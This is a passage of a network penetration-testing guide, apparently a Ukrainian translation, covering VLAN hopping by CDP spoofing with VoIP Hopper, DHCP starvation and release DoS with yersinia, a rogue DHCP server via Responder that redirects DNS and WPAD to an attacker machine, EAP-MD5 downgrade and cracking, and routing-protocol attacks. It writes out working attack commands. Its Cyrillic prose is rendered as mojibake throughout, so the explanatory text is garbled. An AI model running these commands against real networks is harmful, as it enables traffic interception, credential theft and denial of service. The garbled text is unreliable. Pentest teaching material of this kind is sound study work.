**VoIP Hopper** –ø—Ä–æ–ø–æ–Ω—É—î —Ç—Ä–∏ —Ä–µ–∂–∏–º–∏ –¥–ª—è –ø—Ä–æ—Ç–æ–∫–æ–ª—É Cisco Discovery Protocol (CDP):

1. **–†–µ–∂–∏–º –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è** (`-c 0`): –ê–Ω–∞–ª—ñ–∑—É—î –º–µ—Ä–µ–∂–µ–≤—ñ –ø–∞–∫–µ—Ç–∏ –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è VLAN ID.
2. **–†–µ–∂–∏–º –ø—ñ–¥—Ä–æ–±–∫–∏** (`-c 1`): –ì–µ–Ω–µ—Ä—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫—ñ –ø–∞–∫–µ—Ç–∏, —â–æ —ñ–º—ñ—Ç—É—é—Ç—å –ø–∞–∫–µ—Ç–∏ —Ä–µ–∞–ª—å–Ω–æ–≥–æ VoIP –ø—Ä–∏—Å—Ç—Ä–æ—é.
3. **–†–µ–∂–∏–º –ø—ñ–¥—Ä–æ–±–∫–∏ –∑ –≥–æ—Ç–æ–≤–∏–º–∏ –ø–∞–∫–µ—Ç–∞–º–∏** (`-c 2`): –í—ñ–¥–ø—Ä–∞–≤–ª—è—î –ø–∞–∫–µ—Ç–∏, —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ –ø–∞–∫–µ—Ç–∞–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –º–æ–¥–µ–ª—ñ Cisco IP —Ç–µ–ª–µ—Ñ–æ–Ω—É.

–ü–µ—Ä–µ–≤–∞–∂–Ω–∏–π —Ä–µ–∂–∏–º –¥–ª—è —à–≤–∏–¥–∫–æ—Å—Ç—ñ - —Ü–µ —Ç—Ä–µ—Ç—ñ–π. –í—ñ–Ω –≤–∏–º–∞–≥–∞—î –≤–∫–∞–∑–∞—Ç–∏:

* –ú–µ—Ä–µ–∂–µ–≤–∞ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞—Ç–∞–∫—É—é—á–æ–≥–æ (`-i` –ø–∞—Ä–∞–º–µ—Ç—Ä).
* –ù–∞–∑–≤–∞ VoIP –ø—Ä–∏—Å—Ç—Ä–æ—é, —â–æ –µ–º—É–ª—é—î—Ç—å—Å—è (`-E` –ø–∞—Ä–∞–º–µ—Ç—Ä), –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ —Ñ–æ—Ä–º–∞—Ç—É –Ω–∞–π–º–µ–Ω—É–≤–∞–Ω–Ω—è Cisco (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, SEP, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î MAC –∞–¥—Ä–µ—Å–∞).

–£ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–∏—Ö —É–º–æ–≤–∞—Ö, —â–æ–± —ñ–º—ñ—Ç—É–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á–∏–π VoIP –ø—Ä–∏—Å—Ç—Ä—ñ–π, –º–æ–∂–Ω–∞:

* –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ MAC –µ—Ç–∏–∫–µ—Ç–∫—É –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—ñ.
* –ü–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –¥–∏—Å–ø–ª–µ—è —Ç–µ–ª–µ—Ñ–æ–Ω—É, —â–æ–± –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –º–æ–¥–µ–ª—å.
* –ü—ñ–¥–∫–ª—é—á–∏—Ç–∏ VoIP –ø—Ä–∏—Å—Ç—Ä—ñ–π –¥–æ –Ω–æ—É—Ç–±—É–∫–∞ —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏ –∑–∞–ø–∏—Ç–∏ CDP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Wireshark.

–ü—Ä–∏–∫–ª–∞–¥ –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É –≤ —Ç—Ä–µ—Ç—å–æ–º—É —Ä–µ–∂–∏–º—ñ –±—É–¥–µ:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP –ê—Ç–∞–∫–∏

#### –ü–µ—Ä–µ—Ä–∞—Ö—É–Ω–æ–∫
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**–î–≤–∞ —Ç–∏–ø–∏ DoS** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –ø—Ä–æ—Ç–∏ DHCP —Å–µ—Ä–≤–µ—Ä—ñ–≤. –ü–µ—Ä—à–∏–π –ø–æ–ª—è–≥–∞—î –≤ **—ñ–º—ñ—Ç–∞—Ü—ñ—ó –¥–æ—Å—Ç–∞—Ç–Ω—å–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Ñ–µ–π–∫–æ–≤–∏—Ö —Ö–æ—Å—Ç—ñ–≤, —â–æ–± –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –≤—Å—ñ –º–æ–∂–ª–∏–≤—ñ IP-–∞–¥—Ä–µ—Å–∏**.\
–¶–µ–π –Ω–∞–ø–∞–¥ —Å–ø—Ä–∞—Ü—é—î –ª–∏—à–µ —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ DHCP —Å–µ—Ä–≤–µ—Ä–∞ —ñ –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Ü–µ **–Ω–µ–º–æ–∂–ª–∏–≤–æ –≤ Wifi –º–µ—Ä–µ–∂–∞—Ö**.

–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ DHCP DoS - —Ü–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ **DHCP-RELEASE –ø–∞–∫–µ—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —è–∫ –≤–∏—Ö—ñ–¥–Ω–∏–π –∫–æ–¥ –∫–æ–∂–Ω—É –º–æ–∂–ª–∏–≤—É IP**. –¢–æ–¥—ñ —Å–µ—Ä–≤–µ—Ä –ø–æ–¥—É–º–∞—î, —â–æ –≤—Å—ñ –∑–∞–∫—ñ–Ω—á–∏–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
–ë—ñ–ª—å—à –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–π —Å–ø–æ—Å—ñ–± –∑—Ä–æ–±–∏—Ç–∏ —Ü–µ - –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [DHCPing](https://github.com/kamorin/DHCPig)

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–≥–∞–¥–∞–Ω—ñ DoS-–∞—Ç–∞–∫–∏, —â–æ–± –∑–º—É—Å–∏—Ç–∏ –∫–ª—ñ—î–Ω—Ç—ñ–≤ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ –æ—Ä–µ–Ω–¥–∏ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ —Ç–∞ –≤–∏—Å–Ω–∞–∂–∏—Ç–∏ –ª–µ–≥—ñ—Ç–∏–º–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∏, —â–æ–± –≤–æ–Ω–∏ —Å—Ç–∞–ª–∏ –Ω–µ–∞–∫—Ç–∏–≤–Ω–∏–º–∏. –¢–æ–∂, –∫–æ–ª–∏ –ª–µ–≥—ñ—Ç–∏–º–Ω—ñ —Å–ø—Ä–æ–±—É—é—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è, **–≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è, –∑–≥–∞–¥–∞–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∞—Ç–∞—Ü—ñ**.

#### –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —à–∫—ñ–¥–ª–∏–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è

–®–∫—ñ–¥–ª–∏–≤–∏–π DHCP-—Å–µ—Ä–≤–µ—Ä –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é DHCP-—Å–∫—Ä–∏–ø—Ç–∞, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ–≥–æ –∑–∞ –∞–¥—Ä–µ—Å–æ—é `/usr/share/responder/DHCP.py`. –¶–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∞—Ç–∞–∫, —Ç–∞–∫–∏—Ö —è–∫ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è HTTP-—Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ç—Ä–∞—Ñ—ñ–∫—É –Ω–∞ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–µ—Ä–≤–µ—Ä. –û–¥–Ω–∞–∫ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ —à–ª—é–∑—É –º–µ–Ω—à –µ—Ñ–µ–∫—Ç–∏–≤–Ω–µ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –¥–æ–∑–≤–æ–ª—è—î –ª–∏—à–µ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –≤—ñ–¥ –∫–ª—ñ—î–Ω—Ç–∞, –ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –≤—ñ–¥ —Ä–µ–∞–ª—å–Ω–æ–≥–æ —à–ª—é–∑—É. –ù–∞—Ç–æ–º—ñ—Å—Ç—å —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π DNS –∞–±–æ WPAD —Å–µ—Ä–≤–µ—Ä –¥–ª—è –±—ñ–ª—å—à –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—ó –∞—Ç–∞–∫–∏.

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∫–æ–º–∞–Ω–¥ –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ DHCP-—Å–µ—Ä–≤–µ—Ä–∞:

* **–ù–∞—à–∞ IP-–∞–¥—Ä–µ—Å–∞ (–†–µ–∫–ª–∞–º–∞ —à–ª—é–∑—É)**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-i 10.0.0.100`, —â–æ–± —Ä–µ–∫–ª–∞–º—É–≤–∞—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –≤–∞—à–æ—ó –º–∞—à–∏–Ω–∏ —è–∫ —à–ª—é–∑.
* **–õ–æ–∫–∞–ª—å–Ω–µ —ñ–º'—è –¥–æ–º–µ–Ω—É DNS**: –ó–∞ –±–∞–∂–∞–Ω–Ω—è–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-d example.org`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–µ —ñ–º'—è –¥–æ–º–µ–Ω—É DNS.
* **–û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∞ IP-–∞–¥—Ä–µ—Å–∞ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞/—à–ª—é–∑—É**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-r 10.0.0.1`, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –ª–µ–≥—ñ—Ç–∏–º–Ω–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞ –∞–±–æ —à–ª—é–∑—É.
* **IP-–∞–¥—Ä–µ—Å–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ DNS-—Å–µ—Ä–≤–µ—Ä–∞**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-p 10.0.0.100`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ DNS-—Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ.
* **IP-–∞–¥—Ä–µ—Å–∞ –≤—Ç–æ—Ä–∏–Ω–Ω–æ–≥–æ DNS-—Å–µ—Ä–≤–µ—Ä–∞**: –ó–∞ –±–∞–∂–∞–Ω–Ω—è–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-s 10.0.0.1`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –≤—Ç–æ—Ä–∏–Ω–Ω–æ–≥–æ DNS-—Å–µ—Ä–≤–µ—Ä–∞.
* **–ú–∞—Å–∫–∞ –ø—ñ–¥–º–µ—Ä–µ–∂—ñ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-n 255.255.255.0`, —â–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –º–∞—Å–∫—É –ø—ñ–¥–º–µ—Ä–µ–∂—ñ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ.
* **–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è DHCP-—Ç—Ä–∞—Ñ—ñ–∫—É**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-I eth1`, —â–æ–± –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—Ç–∏ DHCP-—Ç—Ä–∞—Ñ—ñ–∫ –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –º–µ—Ä–µ–∂–µ–≤–æ–º—É —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ.
* **–ê–¥—Ä–µ—Å–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó WPAD**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –¥–ª—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó WPAD, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î –≤ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—ñ –≤–µ–±-—Ç—Ä–∞—Ñ—ñ–∫—É.
* **–ü—ñ–¥—Ä–æ–±–∫–∞ IP-–∞–¥—Ä–µ—Å–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —à–ª—é–∑—É**: –î–æ–¥–∞–π—Ç–µ `-S`, —â–æ–± –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É —à–ª—é–∑—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.
* **–í—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –Ω–∞ –≤—Å—ñ DHCP-–∑–∞–ø–∏—Ç–∏**: –î–æ–¥–∞–π—Ç–µ `-R`, —â–æ–± —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–≤ –Ω–∞ –≤—Å—ñ DHCP-–∑–∞–ø–∏—Ç–∏, –∞–ª–µ –±—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —à—É–º–Ω–æ —ñ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–æ.

–ü—Ä–∞–≤–∏–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏, –º–æ–∂–Ω–∞ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π DHCP-—Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Attacks**

–û—Å—å –¥–µ—è–∫—ñ –∑ —Ç–∞–∫—Ç–∏–∫ –∞—Ç–∞–∫, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ—Ç–∏ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ–π 802.1X:

* –ê–∫—Ç–∏–≤–Ω–µ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏–Ω–≥ –ø–∞—Ä–æ–ª—ñ–≤ —á–µ—Ä–µ–∑ EAP
* –ê—Ç–∞–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä RADIUS –∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–∏–º EAP –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º _\*\*_(–≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ)
* –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è EAP –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å —Ç–∞ –æ—Ñ–ª–∞–π–Ω –∑–ª–æ–º –ø–∞—Ä–æ–ª—ñ–≤ (EAP-MD5 —Ç–∞ PEAP)
* –ü—Ä–∏–º—É—Å–æ–≤–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è EAP-MD5 –¥–ª—è –æ–±—Ö–æ–¥—É –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ TLS
* –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É –ø—ñ–¥ —á–∞—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ö–∞–±–∞ –∞–±–æ –ø–æ–¥—ñ–±–Ω–æ–≥–æ

–Ø–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –º—ñ–∂ –∂–µ—Ä—Ç–≤–æ—é —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, –≤—ñ–Ω –º–æ–∂–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–Ω–∏–∑–∏—Ç–∏ (—è–∫—â–æ —Ü–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ) –ø—Ä–æ—Ç–æ–∫–æ–ª –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ EAP-MD5 —Ç–∞ –∑–∞—Ö–æ–ø–∏—Ç–∏ —Å–ø—Ä–æ–±—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü–æ—Ç—ñ–º –≤—ñ–Ω –º–æ–∂–µ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ —Ü–µ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) ‚Äî —Ü–µ –∫–ª–∞—Å –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –≥–∞—Ä—è—á–æ—ó —Ä–µ–∑–µ—Ä–≤–Ω–æ—ó –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ–π–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏**. –ó FHRP —Ñ—ñ–∑–∏—á–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±'—î–¥–Ω–∞–Ω—ñ –≤ –æ–¥–∏–Ω –ª–æ–≥—ñ—á–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, —â–æ –ø—ñ–¥–≤–∏—â—É—î —Å—Ç—ñ–π–∫—ñ—Å—Ç—å –¥–æ –≤—ñ–¥–º–æ–≤ —ñ –¥–æ–ø–æ–º–∞–≥–∞—î —Ä–æ–∑–ø–æ–¥—ñ–ª–∏—Ç–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

**–Ü–Ω–∂–µ–Ω–µ—Ä–∏ Cisco Systems —Ä–æ–∑—Ä–æ–±–∏–ª–∏ –¥–≤–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ FHRP: GLBP —Ç–∞ HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

–í—ñ–¥–æ–º–æ –ø—Ä–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è —Ç—Ä—å–æ—Ö –≤–µ—Ä—Å—ñ–π –ü—Ä–æ—Ç–æ–∫–æ–ª—É –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ–π–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó (RIP): RIP, RIPv2 —Ç–∞ RIPng. –î–∞—Ç–∞–≥—Ä–∞–º–∏ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –¥–æ –ø—ñ—Ä —á–µ—Ä–µ–∑ –ø–æ—Ä—Ç 520 –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é UDP –≤ RIP —Ç–∞ RIPv2, —Ç–æ–¥—ñ —è–∫ –¥–∞—Ç–∞–≥—Ä–∞–º–∏ —Ç—Ä–∞–Ω—Å–ª—é—é—Ç—å—Å—è –Ω–∞ UDP –ø–æ—Ä—Ç 521 —á–µ—Ä–µ–∑ IPv6 multicast –≤ RIPng. –ü—ñ–¥—Ç—Ä–∏–º–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó MD5 –±—É–ª–∞ –≤–≤–µ–¥–µ–Ω–∞ –≤ RIPv2. –ó —ñ–Ω—à–æ–≥–æ –±–æ–∫—É, –Ω–∞—Ç–∏–≤–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –Ω–µ –≤–∫–ª—é—á–µ–Ω–∞ –≤ RIPng; –Ω–∞—Ç–æ–º—ñ—Å—Ç—å –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –Ω–µ–æ–±–æ–≤'—è–∑–∫–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ IPsec AH —Ç–∞ ESP –≤ IPv6.

* **RIP —Ç–∞ RIPv2:** –°–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑ UDP –¥–∞—Ç–∞–≥—Ä–∞–º–∏ –Ω–∞ –ø–æ—Ä—Ç—É 520.
* **RIPng:** –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î UDP –ø–æ—Ä—Ç 521 –¥–ª—è —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—ó –¥–∞—Ç–∞–≥—Ä–∞–º —á–µ—Ä–µ–∑ IPv6 multicast.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ RIPv2 –ø—ñ–¥—Ç—Ä–∏–º—É—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é MD5, —Ç–æ–¥—ñ —è–∫ RIPng –Ω–µ –≤–∫–ª—é—á–∞—î –Ω–∞—Ç–∏–≤–Ω—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, –ø–æ–∫–ª–∞–¥–∞—é—á–∏—Å—å –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ IPsec AH —Ç–∞ ESP –≤ IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** ‚Äî —Ü–µ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó. **–¶–µ –ø—Ä–æ—Ç–æ–∫–æ–ª –≤–µ–∫—Ç–æ—Ä—ñ–≤ –≤—ñ–¥—Å—Ç–∞–Ω—ñ.** –Ø–∫—â–æ **–Ω–µ–º–∞—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –ø–∞—Å–∏–≤–Ω–∏—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤, **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫** –º–æ–∂–µ –≤—Ç—Ä—É—á–∞—Ç–∏—Å—è –≤ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—é EIGRP —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **–æ—Ç—Ä—É—î–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—å –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ü—ñ—ó**. 